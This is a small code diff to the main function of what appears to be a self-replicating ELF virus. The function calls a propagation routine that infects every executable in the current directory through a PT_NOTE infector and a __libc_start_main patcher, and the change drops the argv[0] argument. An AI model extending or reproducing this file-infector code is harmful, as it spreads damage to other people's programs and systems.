@@ -28,7 +28,7 @@ int main() {
   // Propagate myself (virus) into all executables in the current directory.
   vt::propagation::propagate<vt::common::DirectoryIterator,
                              vt::infector::PtNoteInfector,
-                             vt::redirection::LibcStartMainPatcher>(argv[0]);
+                             vt::redirection::LibcStartMainPatcher>();
 
   return 0;
 }
